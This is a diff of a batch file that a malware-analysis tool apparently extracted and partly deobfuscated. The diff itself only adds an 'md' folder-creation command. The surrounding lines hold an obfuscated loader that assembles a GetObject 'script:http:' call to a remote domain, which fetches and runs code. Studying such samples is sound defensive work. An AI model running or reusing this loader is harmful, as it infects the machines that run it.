@@ -1,5 +1,5 @@
 REM Batch extracted by Assemblyline
-C:\BT59TX5\
+md C:\BT59TX5\
 seT YXVE=C:\BT59TX5\BT59TX5
 SEt DNRL=voX3ar C66d="sc"+"r" D66d="ip"+"t:oX3h" E66d="T"+"tP"+":" GoX3etObjoX3ect(C66d+D66d+E66d+'
 sET 0TN=DOYWVDOYWVn7eo5j.realidadeavancada.coDOYWV?1DOYWV') 
